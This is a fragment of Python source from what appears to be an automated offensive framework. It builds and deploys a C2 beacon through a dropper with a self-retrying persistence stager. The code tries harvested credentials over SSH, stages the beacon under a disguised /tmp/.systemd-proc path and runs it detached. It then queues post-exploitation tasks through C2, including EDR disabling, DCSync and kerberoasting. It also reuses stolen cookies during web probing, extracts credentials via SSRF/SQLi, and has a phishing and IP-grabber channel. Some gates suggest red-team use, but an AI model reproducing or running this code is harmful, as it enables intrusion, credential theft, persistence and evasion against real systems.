        return self._target_platform_answer().platform

    def _default_beacon_builder(self, platform: str, c2_host: str,
                                c2_port: int) -> Optional[str]:
        """Compile our OWN C++ beacon for the target platform on demand
        (compile-on-demand, exactly like `generate` from the C2 shell).
        Returns the binary path, or None when the toolchain is missing."""
        try:
            import phantom
            from phantom.utils.builder import compile_beacon
            from phantom.utils.c2_crypto import beacon_config_endpoint
            beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
                                      "payloads", "beacon")
            # the binary embeds C2 host/port at build time — force a rebuild
            # when the requested ENDPOINT changed since the last build. Not a
            # comparison of the whole generated header: that always differed
            # (the builder adds ladder/proxy/pin) so every build was forced.
            force = (beacon_config_endpoint(beacon_dir) != (c2_host, c2_port))
            return compile_beacon(
                platform, os.path.dirname(phantom.__file__),
                force_rebuild=force, arch="x64",
                host=c2_host, port=c2_port, use_ssl=True)
        except Exception:
            return None

    def _build_payload(self) -> str:
        """The deploy command ships PHANTOM's own C++ beacon — never
        third-party payloads. The dropper (chosen by the target OS finding)
        stages the compiled binary from our C2 listener and executes it; the
        beacon then checks in to our OWN C2 and all post-exploitation runs
        through that channel."""
        from phantom.utils.network import get_c2_endpoint
        c2_host, c2_port = get_c2_endpoint()
        answer = self._target_platform_answer()
        platform = answer.platform
        if not answer.known:
            # the artefact family is the one thing that cannot be guessed:
            # an unidentified host gets the Linux default, and the operator
            # is TOLD (a silent default shipped an ELF to Windows before)
            self._emit("note", capability="beacon_build",
                       detail="target OS not identified: deploying the "
                              "linux artefact — run os_detect (or re-run "
                              "with the right profile) if the host is "
                              "Windows/macOS")
        binary = self._beacon_builder(platform, c2_host, c2_port)
        if not binary:
            raise ValueError(
                f"beacon build failed for platform {platform} "
                "(toolchain missing on the operator host?)")
        self._last_beacon_binary = binary
        from phantom.utils.builder import generate_dropper
        # RESILIENT stager (8.1, option C): a single failed download used to
        # end the delivery. The stager tries once, then schedules its own
        # retry WITH the endpoint already embedded, so the second attempt
        # does not depend on the operator or on the channel still being
        # open. It is ON regardless of paranoid — max-OPSEC losing the whole
        # engagement to one failed fetch is not a trade worth making. The
        # retry artefact is persistence, so `--no-resilient` is the explicit
        # opt-out and the artefact names are deterministic for cleanup.
        resilient = getattr(self, "resilient_stager", True)
        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
                                   resilient=resilient)
        if not dropper:
            raise ValueError(f"no dropper defined for platform {platform}")
        self._emit("note", capability="stager",
                   detail=("resilient stager: a failed download schedules "
                           "its own retry with the endpoint embedded "
                           "(cleanup artefact: the retry task/script)"
                           if resilient else
                           "one-shot stager (--no-resilient: no retry "
                           "scheduled)"))
        return dropper

    def _ssh_creds_ok(self, user: str, pw: str) -> bool:
        """Quick probe: does this (user, pw) pair actually open an SSH
        session on the target? Many found creds are web-only (an admin
        account on the app that has no shell). Probing avoids burning the
        beacon deploy on a pair that can never connect.

        Runs through the SAME runner the agent uses (so tests with a fake
        runner keep working): a real sshpass+ssh 'id' against the target."""
        try:
            from shlex import quote as _shq
            from phantom.automation.guidance.kit import _effective_target
            port = self._service_port("ssh")
            target = _effective_target(self.wm)
            opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null " \
                   "-o ConnectTimeout=6 -o BatchMode=no"
            # SECURITY (A-1): user/pw/target are attacker-controlled (harvested
            # ON the target). Every value is shell-quoted before it reaches
            # the command string, and the password travels through the
            # SSHPASS environment variable (`sshpass -e`) instead of `-p`, so
            # it is never an argv element nor shell-interpreted.
            login = _shq(f"{user}@{target}")
            cmd = (f"SSHPASS={_shq(pw)} sshpass -e ssh -p {int(port)} {opts} "
                   f"{login} 'id' 2>/dev/null")
            if self.runtime is not None:
                res = self.runtime.runner(cmd, timeout=12)
            else:
                from phantom.core.executor import execute_quiet
                res = execute_quiet(cmd, timeout=12)
            return bool(getattr(res, "ok", False)) and (
                "uid=" in (getattr(res, "stdout", "") or "")
                or "id=" in (getattr(res, "stdout", "") or ""))
        except Exception:
            return False

    def _wrap_remote_exec(self, command: str) -> str:
        """Deploy the beacon ON the target via SSH (scp + setsid).

        The dropper command alone must never run on the operator box, and a
        curl-dropper executed through a remote ssh one-liner dies of SIGHUP
        the moment ssh closes (the download is never finished). The reliable
        path is the one proven in the lab: scp the compiled binary to the
        target, then launch it detached with setsid so it survives the ssh
        session ending. Uses the validated creds finding and the SSH port
        the scanner discovered.
        """
        platform = self._target_platform()
        if platform != "linux":
            raise ValueError(
                f"auto-mode beacon deploy over SSH supports linux targets "
                f"(got {platform}); use the RCE bridge for other platforms")
        creds = self.wm.find("creds", valid=True)
        if not creds:
            raise ValueError("beacon deploy requires a valid creds finding")
        # the FIRST cred may be a web-only account (admin on the app, no
        # SSH). Chain through every validated pair until one actually opens
        # an SSH session — the beacon deploy runs the first that connects.
        creds = sorted(creds, key=lambda f: (
            1 if str((f.value if isinstance(f.value, dict) else {}).get(
                "service", "")) == "ssh" else 0,
            f.ts if hasattr(f, "ts") else 0.0))
        user = pw = None
        for f in creds:
            c = f.value if isinstance(f.value, dict) else {}
            u, p = c.get("username"), c.get("password")
            if not u or not p:
                continue
            if self._ssh_creds_ok(u, p):
                user, pw = u, p
                break
        if not user or not pw:
            raise ValueError(
                "beacon deploy: no valid SSH credential pair "
                "(web-app creds do not grant shell access)")
        from phantom.automation.guidance.kit import _effective_target
        binary = getattr(self, "_last_beacon_binary", "")
        if not binary or not os.path.exists(binary):
            raise ValueError("beacon binary missing (build did not produce a file)")
        # prefer the STATIC linux build for deployment: the dynamic binary
        # requires a glibc >= 2.38 (Kali), while most targets (Debian
        # bookworm, Ubuntu 22.04 ...) ship 2.34-2.36 and the beacon would
        # die on startup.
        static = os.path.join(os.path.dirname(binary), "beacon_linux_static")
        if os.path.exists(static):
            binary = static
        port = self._service_port("ssh")
        target = _effective_target(self.wm)
        from phantom.utils.network import get_c2_endpoint
        c2_host, c2_port = get_c2_endpoint()
        opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
        # WSL toolbox path translation: when the local binary runs through
        # `wsl -d <distro>`, scp executes INSIDE Linux where C:\... is not a
        # valid path (the deploy dies with scp rc=5). Translate to /mnt/c.
        if os.name == "nt" and ":\\" in binary:
            drive, rest = binary[0].lower(), binary[2:].replace("\\", "/")
            binary = f"/mnt/{drive}{rest}"
        # unique staging path per run: a leftover file owned by another
        # user (or a previous run) would make scp fail with EACCES
        import random
        from shlex import quote as _shq
        stage = f"/tmp/.systemd-proc-{random.randint(10000, 99999)}"
        # SECURITY (A-1): credentials harvested ON the target are
        # interpolated into a shell line. Quote every value, and hand the
        # password to sshpass through SSHPASS (`sshpass -e`) so it never
        # becomes an argv element of scp/ssh (visible in `ps`) nor is it
        # shell-interpreted.
        login = _shq(f"{user}@{target}")
        scp = (f"SSHPASS={_shq(pw)} sshpass -e scp -P {int(port)} {opts} -q "
               f"{_shq(binary)} {login}:{_shq(stage)}")
        # The deploy ssh must return immediately: sshpass+`ssh -f` deadlocks
        # (pty) and a plain ssh blocks while the beacon holds the channel.
        # `(setsid nohup ... &)` detaches INSIDE the remote shell. The
        # double-background matters: in `A && B &` bash forks a subshell for
        # the whole list and runs `setsid nohup beacon` in that subshell's
        # FOREGROUND, so the subshell (and ssh) waits on the beacon — when
        # the beacon's first C2 dial hangs (firewalled SYN, no RST) the ssh
        # call blocks until execute_quiet's timeout and the deploy is
        # recorded as failed even though the beacon IS running. With the
        # `( ... & )` wrapper the beacon is backgrounded inside a throwaway
        # subshell: the subshell exits instantly, sshd sees channel EOF and
        # the one-liner returns at once, while the beacon (setsid → new
        # session, nohup → SIGHUP-immune, stdio to /dev/null) survives.
        # NOTE: no LOCAL trailing `&` — a local background would let
        # execute_quiet's pipe-close kill the wsl child mid-scp (the staged
        # file never arrived and the deploy silently no-oped). The local
        # `setsid` only drops the local controlling terminal; it does not
        # detach the REMOTE process group, which is why the remote side
        # needs its own detach.
        # c2_host/c2_port come from operator config, but they are
        # re-quoted all the same because they are interpolated into the
        # REMOTE shell's argv (the beacon).
        run = (f"SSHPASS={_shq(pw)} setsid sshpass -e ssh -p {int(port)} "
               f"{opts} {login} \"chmod +x {_shq(stage)} && (setsid nohup "
               f"{_shq(stage)} {_shq(str(c2_host))} {_shq(str(c2_port))} "
               f"1 </dev/null >/dev/null 2>&1 &)\"")
        return f"{scp} && {run}"

    def _target_identity_hints(self) -> tuple:
        """Addresses/hostnames a beacon registration can be corroborated
        against. IPs: the engagement target PLUS any victim egress address
        the IP-grabber harvested (victim_ip) — that is the NAT-aware answer
        to "what source IP does our beacon check in from?". Hostnames: every
        hostname the run already attributed to the target."""
        from phantom.automation.guidance.kit import _effective_target
        ips = {str(self.target), str(_effective_target(self.wm))}
        for f in self.wm.find("victim_ip"):
            v = f.value if isinstance(f.value, dict) else {}
            if v.get("ip"):
                ips.add(str(v["ip"]))
        hosts = set()
        for f in self.wm.find("hostname"):
            v = f.value if isinstance(f.value, dict) else {}
            if v.get("hostname"):
                hosts.add(str(v["hostname"]).lower())
        return {ip for ip in ips if ip}, hosts

    def _await_beacon(self, timeout: float = 30.0) -> Optional[str]:
        """Wait for OUR compiled C++ beacon to check in to our own C2.

        Attribution is EVIDENCE-FIRST, strongest signal first:
          1. the listener saw one of the target's own addresses (the target
             itself, or the victim egress IP harvested by the IP-grabber);
          2. the registration's reported hostname matches one the run already
             attributed to the target (NAT-proof);
          3. lab/loopback: the beacon dials back through NAT/loopback —
             accept the private source immediately;
          4. last resort — a foreign (non-operator-local) registration, but
             ONLY when it is the SOLE foreign registration seen across two
             consecutive polls. A plain "first foreign beacon" match could
             attach the session to an unrelated host and queue the operator's
             tasks to the wrong machine; waiting one extra poll is cheap.
        """
        from phantom.core.c2_server import c2_state
        from phantom.automation.guidance.kit import _effective_target
        from phantom.utils.network import own_ips
        effective = _effective_target(self.wm)
        loopback = effective in ("127.0.0.1", "localhost", "::1")
        mine = own_ips()
        target_ips, target_hosts = self._target_identity_hints()
        deadline = time.time() + timeout
        seen: set = set()
        foreign: list = []   # candidate weak matches, accumulated across polls
        weak_polls = 0
        while time.time() < deadline:
            for beacon_id, info in c2_state.get_beacons().items():
                if beacon_id in seen:
                    continue
                seen.add(beacon_id)
                ip = str(info.get("ip") or "")
                host = str(info.get("hostname") or "").lower()
                # 1. exact match on a known target address
                if ip and ip in target_ips:
                    return beacon_id
                # 2. hostname already attributed to the target
                if host and host in target_hosts:
                    return beacon_id
                # 3. lab/loopback: private/loopback source via NAT
                if loopback and ip.startswith(("172.", "10.", "192.168.", "127.")):
                    return beacon_id
                # 4. weak candidate: a foreign (non-operator) source
                if ip and ip not in mine:
                    foreign.append(beacon_id)
            if len(foreign) == 1:
                weak_polls += 1
                if weak_polls >= 2:
                    return foreign[0]
            elif len(foreign) > 1:
                # ambiguous window: never guess, keep waiting
                weak_polls = 0
            time.sleep(0.3)
        return None

    def _require_beacon_session(self, cap, reason: str) -> bool:
        if self._session is None:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id, reason=reason)
            self.wm.record_failure(cap.id, reason)
            return False
        return True

    def _execute_hunt_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """Behavioural hunting runs through the anomaly engine channel:
        endpoint discovery (robots/sitemap/crawl), baseline probes +
        statistical scoring + validation pass (confirmed/severity) +
        mutation escalation on the winning payloads, all in-process and
        bounded. Requests are stealth-governed and reuse stolen session
        cookies when available. Emits HUNT: marker lines the shared
        interpreter turns into hunt_anomaly findings."""
        from phantom.automation.exploit.anomaly import (
            build_cookie_header, hunt_target)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        services = []
        for f in self.wm.find("service"):
            v = f.value if isinstance(f.value, dict) else {}
            services.append(v)
        port = str(slots.get("port") or "")
        if port:
            services = [s for s in services if str(s.get("port")) == port]
        cookies = ""
        stolen = self.wm.find("stolen_cookies")
        if stolen:
            v = stolen[0].value if isinstance(stolen[0].value, dict) else {}
            cookies = build_cookie_header(v.get("cookies", []))
        if not cookies:
            cdp = self.wm.find("cdp_cookies")
            if cdp:
                v = cdp[0].value if isinstance(cdp[0].value, dict) else {}
                cookies = build_cookie_header(v.get("cookies", []))
        if self.hunt_delay is not None:
            delay_fn = (lambda: self.hunt_delay)
        elif self.hunt_runner is not None:
            # An injected runner REPLACES the transport (tests / offline /
            # a caller-supplied prober): there is no live target to pace
            # against, so the human-cadence delay would only burn time.
            delay_fn = (lambda: 0.0)
        else:
            # Human operators drive a web scanner at a steady fast cadence
            # (sub-second), not the 1.5s action cadence used between
            # capabilities. Applying the full governor between probe
            # requests makes one hunt take 10+ minutes (400 probes × 1.5s)
            # — slow enough to look MORE automated, not less. Use a small
            # jittered delay so requests look like a tool run, not a
            # machine-gun burst.
            delay_fn = (lambda: random.uniform(0.15, 0.45))
        try:
            anomalies = hunt_target(self.target, services,
                                    runner=self.hunt_runner,
                                    cookies=cookies, delay_fn=delay_fn,
                                    on_probe=lambda r: self._emit(
                                        "hunt_probe", request=r))
        except Exception as e:
            self.wm.record_action(cap.id, slots, "hunt://web", ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "hunt://web", ok=True,
                              note=f"{len(anomalies)} anomaly candidate(s)")
        if not anomalies:
            self.wm.record_failure(cap.id, "no anomaly candidates")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no anomaly candidates")
            return False
        lines = []
        for a in anomalies:
            lines.append(
                f"HUNT:cls={a.cls} name={a.name} port={port} "
                f"endpoint={a.endpoint} signals={'|'.join(a.signals)} "
                f"score={a.score:.2f} confirmed={str(a.confirmed).lower()} "
                f"severity={a.severity()} evidence={a.evidence}")
        output = "\n".join(lines)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _run_web_fuzz(self) -> None:
        """Generative fuzz pass (brain/fuzz): mutate input grammar on the
        mapped web app, judge by differential oracles. Findings land as
        hunt_anomaly facts so the composition engine can pivot on them.
        Bounded requests; never blocks the chain."""
        from phantom.automation.brain.fuzz.engine import FuzzEngine
        from phantom.automation.brain.fuzz.oracles import Response
        from phantom.automation.guidance.kit import _effective_target
        host = _effective_target(self.wm)
        # an injected sender (tests / campaigns) replaces the default
        # urllib one; the bounded budget wrapper still applies when the
        # default is used
        fuzz_sender = self.fuzz_sender
        port, scheme = 80, "http"
        for f in self.wm.find("service"):
            v = f.value if isinstance(f.value, dict) else {}
            try:
                port = int(str(v.get("port", "80")).split("/")[0])
            except (TypeError, ValueError):
                pass
            svc = str(v.get("service", "")).lower()
            if svc in ("https", "ssl") or port == 443:
                scheme = "https"
        base = f"{scheme}://{host}:{port}"

        def _send(param: str, payload: str) -> Response:
            import urllib.request as urllib
            url = (f"{base}/?{param}="
                   f"{urllib.parse.quote(payload, safe='')}")
            req = urllib.request.Request(
                url,
                headers={"User-Agent": (
                    self.stealth_engine.current_user_agent()
                    if hasattr(self.stealth_engine, "current_user_agent")
                    else "Mozilla/5.0")})
            t0 = time.time()
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read(65536).decode("utf-8", errors="replace")
                    return Response(status=resp.status, body=body,
                                    elapsed=time.time() - t0)
            except urllib.error.HTTPError as e:
                body = (e.read(65536) or b"").decode("utf-8", errors="replace")
                return Response(status=e.code, body=body,
                                elapsed=time.time() - t0)

        deadline = time.time() + 90
        state = {"over": False}

        def _budgeted(param: str, payload: str) -> Optional[Response]:
            if state["over"] or time.time() > deadline:
                state["over"] = True
                return None
            return _send(param, payload)

        engine = FuzzEngine(
            fuzz_sender if fuzz_sender is not None else _budgeted,
            rounds=2, max_requests=48, seed=None)
        findings = engine.run(["id", "q", "file", "page", "url"])
        for f in findings[:8]:
            self.wm.add_finding(
                "hunt_anomaly",
                f"fuzz:{f.mutation.param}",
                {"class": f.verdict.family_hint,
                 "param": f.mutation.param,
                 "oracle": f.verdict.oracle,
                 "endpoint": f"?{f.mutation.param}=",
                 "detail": f.verdict.detail},
                confidence=0.6, source="fuzz")
        if findings:
            covered = getattr(engine, "requests_sent", 0)
            self._emit("fuzz_complete", requests=covered,
                       findings=len(findings),
                       families=sorted({f.verdict.family_hint
                                        for f in findings}))

    def _execute_idor_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """IDOR detection runs through the differential engine channel:
        baseline + reference walk on web endpoints, distinct-object oracle
        (identity markers / size delta / status delta), bounded GETs. The
        LLM gate withholds the leaked body when the advisor is enabled."""
        from phantom.automation.exploit.idor import run_idor_dump
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        llm_on = bool(getattr(self, "llm_advisor", None)
                      and self.llm_advisor.enabled)
        try:
            signals = run_idor_dump(self.wm, self.target,
                                    extract_data=not llm_on)
        except Exception as e:
            self.wm.record_action(cap.id, slots, "idor://web", ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e))
            return False
        self.wm.record_action(cap.id, slots, "idor://web", ok=True,
                              note=f"{len(signals)} IDOR signal(s)")
        if not signals:
            self.wm.record_failure(cap.id, "no IDOR signals")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output="no IDOR signals")
            return False
        output = "\n".join(s.to_marker() for s in signals)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_engine_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """Run an in-process engine capability.

        The engine opens sockets/does the I/O at EXECUTION time only, under
        a timeout, with its markers cached for the run; the interpreter
        turns them into findings. Command synthesis is never involved, so a
        preview of a chain containing this capability touches nothing.
        """
        from phantom.automation.guidance.commands import run_engine
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        try:
            output = run_engine(cap, self.wm, slots)
        except Exception as e:
            self.wm.record_action(cap.id, slots, f"engine://{cap.id}",
                                  ok=False, note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, f"engine://{cap.id}", ok=True,
                              note=f"{len(output)} bytes")
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_web_creds_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """Web credential extraction runs in-process (like the anomaly
        engine): deterministic SSRF/SQLi probes against the discovered web
        services, bounded and non-destructive. Emits WEBCREDS: markers that
        cap.interpret turns into creds findings for the planner."""
        from phantom.automation.exploit.webcreds import run_web_creds_dump
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        try:
            creds = run_web_creds_dump(self.wm, self.target)
        except Exception as e:
            self.wm.record_action(cap.id, slots, "web://creds", ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "web://creds", ok=True,
                              note=f"{len(creds)} credential pair(s)")
        if not creds:
            self.wm.record_failure(cap.id, "no credentials in web app")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no credentials in web app")
            return False
        output = "\n".join(c.marker() for c in creds)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_post_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """Post-exploitation runs THROUGH the beacon channel (C2 task).

        The command is queued to the established beacon session; the result
        is collected from the C2 and interpreted back into findings.
        """
        if not self._require_beacon_session(
                cap, "no beacon session to run post-exploitation"):
            return False
        # disabling the defensive stack is destructive and loud: only an
        # aggressive run may do it (its precondition already requires a
        # SYSTEM-level session on top of this gate).
        if cap.id == "edr_disable" and not self.aggressive:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="EDR/AV disable requires --aggressive")
            self.wm.record_failure(cap.id, "EDR/AV disable requires --aggressive")
            return False
        # injection requires SYSTEM-level privileges confirmed first
        if cap.id == "inject_beacon" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges first")
            self.wm.record_failure(cap.id, "requires SYSTEM privileges first")
            return False
        # AD attack paths require the domain facts first
        if cap.id in ("kerberoast", "as_rep_roast", "dc_sync",
                      "hash_crack") and not self.wm.find("ad_domain"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires domain enumeration (ad_enum) first")
            self.wm.record_failure(cap.id, "requires ad_domain first")
            return False
        # DCSync additionally needs a SYSTEM-level session on the domain
        if cap.id == "dc_sync" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges on the DC first")
            self.wm.record_failure(cap.id, "requires SYSTEM on the DC")
            return False
        # lateral movement needs a peer host inside the engagement scope
        if cap.id in ("lateral_pivot", "smb_pivot", "winrm_pivot") \
                and not slots.get("host"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no peer host for lateral movement "
                              "(single-target run)")
            self.wm.record_failure(cap.id, "no peer host")
            return False
        # OS-specific escalation vectors only against the matching OS
        from phantom.automation.guidance.kit import _target_os as _target_os_name
        os_name = (slots.get("os") or _target_os_name(self.wm)).lower()
        if cap.id == "privesc_sudo" and "windows" in os_name:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="sudo escalation requires a Linux target")
            self.wm.record_failure(cap.id, "not a Linux target")
            return False
        if cap.id == "privesc_service_perms" and os_name and "windows" not in os_name:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="service-permissions escalation requires Windows")
            self.wm.record_failure(cap.id, "not a Windows target")
            return False
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        cmd = self._dyn.shape(cmd, self.wm)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        task_id = self._session.task(cmd)
        if task_id is None:
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="task queue failed (no C2 session)")
            self.wm.record_failure(cap.id, "task queue failed")
            return False
        output = self._session.wait_result(task_id, timeout=cap.timeout)
        self.wm.record_action(cap.id, slots, cmd, ok=bool(output is not None),
                              note=f"task {task_id}")
        if output is None:
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output="task timed out")
            self.wm.record_failure(cap.id, f"task {task_id} timed out")
            return False
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_ad_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """AD/domain capabilities are DUAL-channel.

        With a beacon session the command is queued through the C2 (the
        channel used when we are INSIDE the network). Without one the same
        command runs directly from the operator box against the discovered
        DC (LDAP/Kerberos reachable) — so the AD chain (ad_enum →
        kerberoast / as_rep_roast → hash_crack) works with NO beacon at
        all, exactly like a remote AD engagement with only credentials.
        """
        # AD attack paths require the domain facts first (same discipline
        # as the post channel)
        if cap.id in ("kerberoast", "as_rep_roast", "dc_sync",
                      "hash_crack") and not self.wm.find("ad_domain"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires domain enumeration (ad_enum) first")
            self.wm.record_failure(cap.id, "requires ad_domain first")
            return False
        if cap.id == "dc_sync" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges on the DC first")
            self.wm.record_failure(cap.id, "requires SYSTEM on the DC")
            return False
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        cmd = self._dyn.shape(cmd, self.wm)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        if self._session is not None:
            # beacon channel: queue the task and collect the result
            task_id = self._session.task(cmd)
            if task_id is None:
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output="task queue failed (no C2 session)")
                self.wm.record_failure(cap.id, "task queue failed")
                return False
            output = self._session.wait_result(task_id, timeout=cap.timeout)
            self.wm.record_action(cap.id, slots, cmd,
                                  ok=bool(output is not None),
                                  note=f"task {task_id}")
            if output is None:
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output="task timed out")
                self.wm.record_failure(cap.id, f"task {task_id} timed out")
                return False
        else:
            # operator channel: run the tool command from the operator box
            run = self.runtime.run(cmd, category=cap.category,
                                   stealth_level=cap.stealth_level,
                                   agent="agent-1", timeout=cap.timeout)
            self.wm.record_action(cap.id, slots, cmd, ok=run.ok,
                                  opsec=self.runtime.cost_per_action)
            if not run.ok:
                self.wm.record_failure(cap.id, run.output or "execution failed")
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output=(run.output or "execution failed")[:300])
                self._fallback.record(
                    cap.category, cap.id, self.target, ok=False,
                    reason=(run.output or "execution failed")[:200],
                    elapsed=getattr(run, "elapsed", 0.0))
                return False
            output = run.output or ""
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_social_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """OSINT/social-engineering capabilities execute through the
        SocialEngine (sherlock/theHarvester, breach lookup, persona mailbox,
        phish delivery, IP-grabber polling) instead of the OS shell.

        The engine emits stable marker lines (IDENTITY:/BREACH:/PERSONA:/
        PHISH_SENT:/VICTIM_IP:) that the shared social interpreter turns
        back into WorldModel findings — so the identity chain converges on
        a real victim_ip and the network chain takes over from there.
        """
        if self.social_engine is None:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no social engine available")
            self.wm.record_failure(cap.id, "no social engine")
            return False
        # delivery transports (SMTP/IMAP, a DM gateway, an SMS API) are an
        # OPERATOR secret: a phish is never attempted against a real victim
        # when the channel is unconfigured — it would either fail opaquely
        # or fall back to something that leaks. Block with a precise reason
        # so the operator sees exactly which env vars are missing. Only the
        # REAL engine is gated: an injected engine (tests / a custom sender)
        # owns its own delivery and must not be second-guessed here.
        missing = []
        if isinstance(self.social_engine, SocialEngine):
            try:
                from phantom.automation.social.transports import (
                    missing_transports,
                )
                missing = missing_transports(cap.id)
            except Exception:
                missing = []
        if missing:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="transport not configured: " + ", ".join(missing))
            self.wm.record_failure(cap.id, "transport not configured")
            return False
        # branch-aware toolchain: social capabilities shell out per target
        # TYPE (username -> sherlock, email -> theHarvester), which no
        # static tools list can express. Refuse with a tool_missing event
        # (install hints downstream) instead of failing opaquely inside
        # the engine two minutes later. Only the REAL engine is gated:
        # an injected engine (tests / custom sender) owns its tooling.
        if isinstance(self.social_engine, SocialEngine):
            try:
                from phantom.automation.guidance.kit import social_tools_for
                needed = social_tools_for(cap.id, self.wm.target_type)
            except Exception:
                needed = []
            if needed and self.toolchain.resolve(needed) is None:
                missing_tools = self.toolchain.missing(needed)
                self._mark_failed(cap.id)
                self._emit("tool_missing", capability=cap.id,
                           tools=missing_tools)
                self.wm.record_failure(
                    cap.id, "tool unavailable: " + ", ".join(missing_tools))
                return False
        # I2: ACTIVE identity probes (reset-enum, SMTP verify) need the
        # dedicated consent, separate from --aggressive. Refuse with the
        # precise reason instead of running and failing opaquely.
        if cap.id in ("reset_enum", "email_verify"):
            from phantom.automation.identity_ops import active_consent_enabled
            if not active_consent_enabled(self.wm):
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id,
                           reason="active identity probes need the dedicated "
                                  "consent (--identity-active / "
                                  "PHANTOM_IDENTITY_ACTIVE=1)")
                self.wm.record_failure(cap.id, "identity active consent missing")
                return False
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        run = self.runtime.run("social:" + cap.id, category=cap.category,
                               stealth_level=cap.stealth_level,
                               agent="agent-1", timeout=cap.timeout)
        try:
            if cap.id in ("harvest_campaign", "wait_follow"):
                # passive human-wait capabilities: poll in chunks, emit
                # 'waiting' events so the operator sees the sleep state,
                # and only succeed when the human actually interacted
                output = self._run_social_wait_capability(cap, slots)
            else:
                output = self._run_social_method(cap.id, slots)
        except Exception as e:
            self.wm.record_action(cap.id, slots, "social:" + cap.id, ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
